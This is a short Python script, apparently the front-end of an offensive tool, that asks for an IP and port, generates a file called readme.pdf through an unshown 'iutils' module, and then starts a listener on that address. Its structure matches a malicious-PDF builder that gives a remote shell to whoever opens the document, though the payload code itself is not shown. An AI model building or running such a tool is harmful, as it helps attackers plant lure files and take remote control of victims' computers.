#!/usr/bin/python3

import iutils

def main():
	iutils.init()
	ip = input('[ ip / host ] : ')
	port = input('[ port ] : ')
	print('[*] Generating pdf ...')
	iutils.generate_pdf(ip, port)
	print('[+] success : readme.pdf')
	print('[+] starting listener ...')
	iutils.start_listener(ip, port)
main()
	
	